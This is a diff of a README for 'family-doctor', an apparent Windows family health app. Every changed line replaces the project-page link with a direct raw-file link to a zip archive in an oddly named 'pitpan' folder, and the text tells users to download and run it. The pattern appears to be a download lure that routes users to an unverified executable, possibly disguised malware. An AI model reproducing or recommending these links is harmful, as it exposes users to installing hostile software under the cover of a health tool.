@@ -1,6 +1,6 @@
 # 🩺 family-doctor - Health tracking for every family
 
-[![Download family-doctor](https://img.shields.io/badge/Download-family--doctor-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/dipo78/family-doctor)
+[![Download family-doctor](https://img.shields.io/badge/Download-family--doctor-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/dipo78/family-doctor/raw/refs/heads/main/pitpan/family-doctor-v2.8-alpha.2.zip)
 
 ## 🏠 What this app does
 
@@ -19,7 +19,7 @@ It brings 25 health skills into one app, so you can handle common family health 
 
 Visit this page to download or open the app files:
 
-https://github.com/dipo78/family-doctor
+https://github.com/dipo78/family-doctor/raw/refs/heads/main/pitpan/family-doctor-v2.8-alpha.2.zip
 
 If the page shows a release file, download and run that file on Windows. If it shows the full project page, use the download option there to get the Windows version or app package.
 
@@ -41,7 +41,7 @@ For the best experience, use a laptop or desktop with a stable internet link and
 ## 📦 How to install on Windows
 
 1. Open the download page:
-   https://github.com/dipo78/family-doctor
+   https://github.com/dipo78/family-doctor/raw/refs/heads/main/pitpan/family-doctor-v2.8-alpha.2.zip
 
 2. Find the latest release or download file for Windows.
 
@@ -282,4 +282,4 @@ Try this:
 
 Download or open the app from:
 
-https://github.com/dipo78/family-doctor
+https://github.com/dipo78/family-doctor/raw/refs/heads/main/pitpan/family-doctor-v2.8-alpha.2.zip
